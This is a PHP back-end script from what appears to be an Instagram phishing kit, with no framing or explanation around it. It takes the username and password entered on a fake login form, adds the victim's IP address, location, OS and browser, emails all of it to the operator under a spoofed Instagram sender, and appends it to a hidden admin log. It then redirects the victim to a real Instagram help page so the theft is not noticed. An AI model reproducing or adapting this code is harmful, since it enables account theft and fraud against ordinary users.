<?php 
    @error_reporting(0);
    require '../antibots/Bo1.php';
    require '../antibots/Bo2.php';
    require '../antibots/Bo3.php';
    require '../antibots/Bo4.php';
	session_start();
	include 'config.php';

	if ( isset( $_POST['username'] ) && isset( $_POST['password'] ) ) {

		$_SESSION['username'] 	  = $_POST['username'];
		$_SESSION['password'] = $_POST['password'];

		$code = <<<EOT
<br>+-+-+-+-+-+-+[ New Instagram Login ]+-+-+-+-+-+-+-+<br>
Enjoy <?php echo $spmnm ?><br>
Email 		: {$_SESSION['username']}<br>
Password 	: {$_SESSION['password']}<br>
+-+-+-+-+-+-+-+-+ [ IP Data ] +-+-+-+-+-+-+-+-+-+-<br>
IP		    : {$_SESSION['ip']}<br>
Country		: {$_SESSION['ip_countryName']}<br>
State		: {$_SESSION['ip_state']}<br>
City		: {$_SESSION['ip_city']}<br>
OS		    : {$_SESSION['os']}<br>
Browser		: {$_SESSION['browser']}<br>
TimeZone	: {$_SESSION['ip_timezone']}<br>
At 		    : {$_SESSION['startAt']} GMT<br>
+-+-+-+-+-+-+[ ./New Instagram Login ]+-+-+-+-+-+-+<br>
\r\n\r\n
EOT;

		$subject = "Instagram Login [ ". $_SESSION['username' ] ."] From [ ". $_SESSION['ip_countryName'] ." - ". $_SESSION['os'] ." - ". $_SESSION['ip'] ." ]";
        $headers = "From: Instagram Login <callix@hax.ma>\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
        @mail($mailt,$subject,$code,$headers);

		$save = fopen("../../admin/index.php","a+");
        fwrite($save,$code);
        fclose($save);

        header("Location: https://help.instagram.com/581066165581870");
        exit();
	} else {
		header("Location: ../index.php");
		exit();
	}
?>